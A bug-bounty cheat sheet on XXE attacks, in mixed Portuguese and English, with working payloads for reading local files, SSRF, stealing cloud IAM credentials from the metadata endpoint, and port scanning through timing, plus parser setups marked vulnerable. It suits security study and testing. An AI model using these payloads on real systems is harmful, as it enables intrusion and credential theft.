# Basic XXE (XML External Entity) Exploitation

**Criticidade**: 🔴 Crítica (CVSS 8.5-9.5)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $2,000 - $15,000 USD

---

## 🔬 XML External Entity Basics

### XML DTD Entities

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

**How it works:**
1. DTD defines entity `xxe`
2. `SYSTEM` keyword loads external resource
3. Entity reference `&xxe;` expands to file content
4. Parser returns file content in XML

### Vulnerable XML Parsers

**Python (lxml):**
```python
# VULNERABLE
from lxml import etree
parser = etree.XMLParser(resolve_entities=True)
tree = etree.fromstring(xml_data, parser)
```

**PHP:**
```php
// VULNERABLE
libxml_disable_entity_loader(false);
$dom = new DOMDocument();
$dom->loadXML($xml);
```

**Java:**
```java
// VULNERABLE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(xml);
```

---

## 💣 Exploitation Techniques

### File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### SSRF

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-api:8080/admin">
]>
<root><data>&xxe;</data></root>
```

### Cloud Metadata

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>
```

### Port Scanning

```python
# Scan ports via XXE timing
for port in range(1, 1000):
    payload = f'''
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "http://internal-host:{port}/">
    ]>
    <root><data>&xxe;</data></root>
    '''
    response_time = send_xxe(payload)
    if response_time < 5:  # Quick response = port open
        print(f"Port {port} open!")
```

---

## 🔥 Real Cases

**Google Toolbar XXE (2014):**
- File read via XXE
- Access to internal systems
- $10,000 bounty

**Facebook XXE (2015):**
- SSRF to internal APIs
- $20,000 bounty

---

**Última atualização**: 2024
